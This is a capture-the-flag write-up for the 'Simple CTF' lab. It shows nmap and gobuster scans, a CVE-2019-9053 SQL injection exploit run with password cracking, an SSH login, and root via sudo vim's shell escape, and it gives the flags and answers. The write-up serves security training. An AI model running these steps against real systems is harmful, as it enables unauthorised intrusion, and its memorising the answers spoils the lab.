---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Task 1: Simple CTF
### How many services are running under port 1000?
Let's scan the target using `nmap`.
```
$ nmap -sC -sV 10.10.48.90 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-07 22:29 IST
Nmap scan report for 10.10.48.90
Host is up (0.14s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.48.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.85 seconds
```
There are three open ports:

| Port | Service |
| :-: | :-: |
| 21 | ftp |
| 80 | http |
| 2222 | ssh |
 
Out of the three, only two are below 1000.
### Answer
```
2
```

&nbsp;

### What is running on the higher port?
The highest port is 2222 which has SSH running on it.
### Answer
```
ssh
```

&nbsp;

### What's the CVE you're using against the application?
We can use `gobuster` to brute force the web pages.
```
$ gobuster dir -u http://10.10.48.90 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.48.90
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 290]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 299]
/simple               (Status: 301) [Size: 311] [--> http://10.10.48.90/simple/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
Let's visit the `/simple` page.
On the web page, in the footer section we can find the version of the CMS.

![2](https://github.com/Knign/Write-ups/assets/110326359/2609b04d-ac85-4bb3-9e78-76f396abe0e7)

Let's check Exploit-DB to see if there is an exploit for that version.

![3](https://github.com/Knign/Write-ups/assets/110326359/01957b9a-77f1-40cd-b8d5-77dd86433752)

### Answer
```
CVE-2019-9053
```

&nbsp;

### To what kind of vulnerability is the application vulnerable?
The vulnerability is mentions in the CVE page.

![4](https://github.com/Knign/Write-ups/assets/110326359/2627f18d-3f9d-4a34-9e83-14e12986d914)

### Answer
```
SQLi
```

&nbsp;

### What's the password?
Let's save the exploit to a file called `exploit.py`.

If you don't have `termcolor`, you can use the following command:
```
pip install termcolor
```
We will have to modify the exploit a bit.
```
$ python exploit.py -u http://10.10.48.90/simple --crack -w /usr/share/wordlists/rockyou.txt

[+] Salt for password found: 1dac0d92e9f2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Pasword cracked: secret
```
### Answer
```
secret
```

&nbsp;

### Where can you login with the details obtained?
Let's try and login through SSH using the `mitch` username and `secret` password.
```
$ ssh mitch@10.10.48.90 -p 2222
The authenticity of host '[10.10.48.90]:2222 ([10.10.48.90]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.48.90]:2222' (ED25519) to the list of known hosts.
mitch@10.10.48.90's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 
```
Note that we had to specify port 2222 because that is the port SSH was running on in this machine.
### Answer
```
ssh
```

&nbsp;

### What's the user flag?
We can stabilize the shell using the following commands:
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
mitch@Machine:~$ export TERM=xterm
mitch@Machine:~$ 
```
Let's read the user flag.
```
mitch@Machine:~$ cat user.txt 
G00d j0b, keep up!
```
### Answer
```
G00d j0b, keep up!
```

&nbsp;

### Is there any other user in the home directory? What's its name?
Let's check.
```
mitch@Machine:~$ ls /home/
mitch  sunbath
```
### Answer
```
sunbath
```

&nbsp;

### What can you leverage to spawn a privileged shell?
We can check the files that `mitch` can execute using the following command:
```
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
### Answer
```
vim
```

&nbsp;

### What's the root flag?
We can find an exploit on GTFOBins.

![5](https://github.com/Knign/Write-ups/assets/110326359/5e49ef4e-df15-4e84-b8e3-31609938f45f)

Let's run the exploit.
```
mitch@Machine:~$ sudo /usr/bin/vim -c '!/bin/sh'

#
```
We can now read the root flag.
```
# cat /root/root.txt
Well d0n3. You made it!
```
### Answer
```
Well d0n3. You made it!
```
